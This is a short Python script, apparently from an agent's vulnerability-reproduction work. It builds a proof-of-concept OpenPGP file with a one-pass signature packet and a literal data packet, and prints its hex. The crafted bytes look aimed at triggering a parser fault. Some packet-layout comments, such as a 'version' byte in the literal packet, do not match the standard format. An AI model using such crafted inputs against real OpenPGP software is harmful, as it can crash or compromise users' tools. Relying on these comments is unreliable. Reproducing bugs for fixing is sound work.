import struct

def create_poc():
    """Create a minimal OpenPGP message with a one-pass signature followed by a plaintext packet."""
    data = b""
    
    # One-Pass Signature Packet (tag 4)
    # Format: version(1) | sig_class(1) | digest_algo(1) | pubkey_algo(1) | keyid(8) | nested(1)
    onepass_sig = bytes([
        4,          # version
        0x00,       # sig_class: binary signature
        8,          # digest_algo: SHA256
        1,          # pubkey_algo: RSA
        0, 0, 0, 0, 0, 0, 0, 0,  # keyid (all zeros)
        0,          # nested flag
    ])
    
    # Old format packet header for tag 4
    # length = len(onepass_sig)
    if len(onepass_sig) < 256:
        header = bytes([0x84, len(onepass_sig)])
    else:
        header = bytes([0x85, len(onepass_sig) >> 8, len(onepass_sig) & 0xFF])
    
    data += header + onepass_sig
    
    # Plaintext Packet (tag 11)
    # Format: version(1) | mode(1) | namelen(1) | name(namelen) | timestamp(4) | data
    name = b"a"
    timestamp = 0
    content = b"test"
    
    plaintext = bytes([
        4,          # version
        't'.encode()[0],  # mode: text
        len(name),  # namelen
    ]) + name + struct.pack(">I", timestamp) + content
    
    # Old format packet header for tag 11
    if len(plaintext) < 256:
        header = bytes([0x8B, len(plaintext)])
    else:
        header = bytes([0x8C, len(plaintext) >> 8, len(plaintext) & 0xFF])
    
    data += header + plaintext
    
    return data

poc = create_poc()
with open("/workspace/poc.gpg", "wb") as f:
    f.write(poc)
print(f"PoC written: {len(poc)} bytes")
print(f"Hex: {poc.hex()}")
EOF
